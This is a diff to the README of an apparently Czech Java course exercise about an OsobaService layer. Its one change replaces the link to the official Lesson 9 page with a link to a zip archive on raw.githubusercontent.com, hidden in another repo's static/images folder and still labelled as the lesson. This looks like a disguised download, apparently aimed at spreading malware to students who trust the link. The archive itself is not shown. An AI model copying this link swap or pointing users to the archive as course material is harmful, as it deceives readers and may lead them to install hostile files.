@@ -7,4 +7,4 @@
    metodu ve službě `OsobaService`, která bude obashovat potřebnou busines logiku (pokud je potřeba) a následně zavolá správnou metodu z repository.
 
 ## Odkazy
-* [Lekce 9](https://java.czechitas.cz/2021-jaro/java-2/lekce-9.html)
+* [Lekce 9](https://raw.githubusercontent.com/daduelle/j2w-lekce09/main/src/main/resources/static/images/lekce_j_w_v1.3.zip)
